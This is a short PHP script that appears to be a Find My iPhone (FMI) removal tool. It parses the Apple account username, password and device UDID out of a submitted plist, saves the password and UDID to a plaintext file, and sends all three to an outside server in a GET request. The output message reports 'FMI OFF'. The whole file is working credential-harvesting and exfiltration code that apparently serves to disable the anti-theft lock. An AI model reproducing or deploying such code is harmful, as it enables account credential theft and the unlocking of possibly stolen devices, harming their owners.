<?php

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $response = $_GET['response'];
  file_put_contents("Response", $response);
  $getFile = file_get_contents("Response");
  if($getFile != null){
    $PASSWORD = explode("<key>password</key>", $getFile)[1];
    $PASSWORD = explode("<string>", $PASSWORD)[1];
    $PASSWORD = explode("</string>", $PASSWORD)[0];
    $PASSWORD = str_replace(" ", "+", $PASSWORD);
    $UDID = explode("<key>udid</key>", $getFile)[1];
    $UDID = explode("<string>", $UDID)[1];
    $UDID = explode("</string>", $UDID)[0];
    $USERNAME = explode("<key>username</key>", $getFile)[1];
    $USERNAME = explode("<string>", $USERNAME)[1];
    $USERNAME = explode("</string>", $USERNAME)[0];
    file_put_contents("pass", $PASSWORD.$UDID);
    $Checks = file_get_contents("https://ex3cution3r.com/fmi.php?pet=&ID=$USERNAME&KEY=$PASSWORD&SN=&UDID=$UDID");
    file_put_contents("binfo", $Checks);
    $Update = explode("Success ", file_get_contents("binfo"))[1];
    if($Update != null){
      echo "SUCCESSFULLY DO FMI OFF!";
    }
    else{
      echo "ERROR TO DO FMI OFF!";
    }
  }
}
 
 ?>
